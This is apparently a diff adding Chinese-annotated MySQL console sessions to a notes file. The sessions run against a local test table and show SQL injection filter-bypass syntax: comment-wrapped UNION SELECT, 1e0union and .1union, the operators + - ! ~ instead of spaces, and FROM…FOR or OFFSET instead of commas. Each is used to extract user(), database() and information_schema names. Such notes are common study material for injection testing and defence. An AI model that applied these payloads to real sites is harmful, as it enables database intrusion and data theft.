@@ -183,4 +183,262 @@ mysql> select-count(3)outcome from students; #可以省略as和空格
 +---------+
 1 row in set (0.00 sec)
 
+mysql> select/*!**/from students;
++----+--------+--------+------+
+| id | name   | gender | age  |
++----+--------+--------+------+
+|  1 | Tiger  | male   |   27 |
+|  2 | Tina   | female |   28 |
+|  3 | Felica | female |   26 |
++----+--------+--------+------+
+3 rows in set (0.00 sec)
+
+mysql> select substr(user() from 1 for 3)outcome;
++---------+
+| outcome |
++---------+
+| roo     |
++---------+
+1 row in set (0.00 sec)
+
+mysql> select substr(user()from 1 for 3)outcome;
++---------+
+| outcome |
++---------+
+| roo     |
++---------+
+1 row in set (0.00 sec)
+
+mysql> select mid(user()from 1 for 3)outcome;
++---------+
+| outcome |
++---------+
+| roo     |
++---------+
+1 row in set (0.00 sec)
+
+mysql> select mid(user()from 1 for 3)outcome limit 1; #使用from for来替换函数中的','
++---------+
+| outcome |
++---------+
+| roo     |
++---------+
+1 row in set (0.00 sec)
+
+mysql> select mid(user()from 1 for 3)outcome limit 1,1;
+Empty set (0.00 sec)
+
+mysql> select mid(user()from 1 for 3)outcome limit 1 offset 1; #使用offset替换','
+Empty set (0.00 sec)
+
+mysql> select mid(user(),1,3)outcome;  #如果使用mid函数或者substr函数则会使用','分隔符来分割参数
++---------+
+| outcome |
++---------+
+| roo     |
++---------+
+1 row in set (0.00 sec)
+
+mysql> select substr(user(),1,3)outcome;
++---------+
+| outcome |
++---------+
+| roo     |
++---------+
+1 row in set (0.00 sec)
+
+
+mysql> select * from students where name in ('Tiger');
++----+-------+--------+------+
+| id | name  | gender | age  |
++----+-------+--------+------+
+|  1 | Tiger | male   |   27 |
++----+-------+--------+------+
+1 row in set (0.00 sec)
+
+mysql> select substr(name, 1,1) in ('T') from students;
++----------------------------+
+| substr(name, 1,1) in ('T') |
++----------------------------+
+|                          1 |
+|                          1 |
+|                          0 |
++----------------------------+
+3 rows in set (0.00 sec)
+
+mysql> select strcmp(left(name,1),'T') from students;
++--------------------------+
+| strcmp(left(name,1),'T') |
++--------------------------+
+|                        0 |
+|                        0 |
+|                       -1 |
++--------------------------+
+3 rows in set (0.00 sec)
+
+mysql> select * from students where name between 'R' and 'U'; #使用between替换<>
++----+-------+--------+------+
+| id | name  | gender | age  |
++----+-------+--------+------+
+|  1 | Tiger | male   |   27 |
+|  2 | Tina  | female |   28 |
++----+-------+--------+------+
+2 rows in set (0.00 sec)
+
+mysql> show databases; #从information_schema中的SCHEMATA表获取的信息
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| test               |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql> show tables from test; #从information_schema中的TABLES表获取的信息 
++----------------+
+| Tables_in_test |
++----------------+
+| students       |
++----------------+
+1 row in set (0.00 sec)
+
+mysql> show columns from test.students;  #从information_schema中的COLUMNS表获取的信息  
++--------+--------------+------+-----+---------+-------+
+| Field  | Type         | Null | Key | Default | Extra |
++--------+--------------+------+-----+---------+-------+
+| id     | int          | NO   | PRI | NULL    |       |
+| name   | varchar(255) | YES  |     | NULL    |       |
+| gender | varchar(255) | YES  |     | NULL    |       |
+| age    | int          | YES  |     | NULL    |       |
++--------+--------------+------+-----+---------+-------+
+4 rows in set (0.00 sec)
+
+mysql> select 1,2 from students /*!union/**//**/all*//*!select*//*!user*/(),/*!database*/();
++----------------+------+
+| 1              | 2    |
++----------------+------+
+| 1              | 2    |
+| 1              | 2    |
+| 1              | 2    |
+| 1              | 2    |
+| root@localhost | test |
++----------------+------+
+5 rows in set (0.00 sec)
+
+mysql> select 1,2 from students where id=1e0union all select user(),database(); #使用科学计数法
++----------------+------+
+| 1              | 2    |
++----------------+------+
+| 1              | 2    |
+| root@localhost | test |
++----------------+------+
+2 rows in set (0.00 sec)
+
+mysql> select 1,2 from students where id=1e0union all select+1,user(); #使用'+'
++---+----------------+
+| 1 | 2              |
++---+----------------+
+| 1 | 2              |
+| 1 | root@localhost |
++---+----------------+
+2 rows in set (0.00 sec)
+
+mysql> select 1,2 from students where id=1e0union all select-1,user(); #使用'-'
++----+----------------+
+| 1  | 2              |
++----+----------------+
+|  1 | 2              |
+| -1 | root@localhost |
++----+----------------+
+2 rows in set (0.00 sec)
+
+mysql> select 1,2 from students where id=1e0union all select!1,user(); #使用'!'
++---+----------------+
+| 1 | 2              |
++---+----------------+
+| 1 | 2              |
+| 0 | root@localhost |
++---+----------------+
+2 rows in set, 1 warning (0.00 sec)
+
+mysql> select 1,2 from students where id=1e0union all select~1,user(); #使用'~'
++----------------------+----------------+
+| 1                    | 2              |
++----------------------+----------------+
+|                    1 | 2              |
+| 18446744073709551614 | root@localhost |
++----------------------+----------------+
+2 rows in set (0.00 sec)
+
+mysql> select 1,2 from students where id=1e0union all select~1,(select user());
++----------------------+----------------+
+| 1                    | 2              |
++----------------------+----------------+
+|                    1 | 2              |
+| 18446744073709551614 | root@localhost |
++----------------------+----------------+
+2 rows in set (0.00 sec)
+
+mysql> select 1,2 from students where id=1e0union all select~1,(select `schema_name` from information_schema.schemata limit 1);  #使用'``'
++----------------------+-------+
+| 1                    | 2     |
++----------------------+-------+
+|                    1 | 2     |
+| 18446744073709551614 | mysql |
++----------------------+-------+
+2 rows in set (0.00 sec)
+
+mysql> select 1,2 from students where id=1e0union all select@`id`,(select `schema_name` from information_schema.schemata limit 1); #使用@``
++------------+-------+
+| 1          | 2     |
++------------+-------+
+| 0x31       | 2     |
+| 0x         | mysql |
++------------+-------+
+2 rows in set (0.00 sec)
+
+mysql> select 1,2 from students where id=.1union all select+1,(select `schema_name` from information_schema.schemata limit 1); #使用'.'符号
++---+-------+
+| 1 | 2     |
++---+-------+
+| 1 | mysql |
++---+-------+
+1 row in set (0.00 sec)
+
+mysql> select 1,2 from students where id=.1union/**/ all select+1,(select `schema_name` from information_schema.schemata limit 1);
++---+-------+
+| 1 | 2     |
++---+-------+
+| 1 | mysql |
++---+-------+
+1 row in set (0.00 sec)
+
+mysql> select 1,2 from students where id=.1union/*.1*/ all select+1,(select `schema_name` from information_schema.schemata limit 1);
++---+-------+
+| 1 | 2     |
++---+-------+
+| 1 | mysql |
++---+-------+
+1 row in set (0.00 sec)
+
+mysql> select 1,2 from students where id=.1union/*.1*/ all select'1',(select `schema_name` from information_schema.schemata limit 1); #使用单引号
++---+-------+
+| 1 | 2     |
++---+-------+
+| 1 | mysql |
++---+-------+
+1 row in set (0.00 sec)
+
+mysql> select 1,2 from students where id=.1union/*.1*/ all select"1",(select `schema_name` from information_schema.schemata limit 1);  #使用双引号
++---+-------+
+| 1 | 2     |
++---+-------+
+| 1 | mysql |
++---+-------+
+1 row in set (0.00 sec)
+
+
 
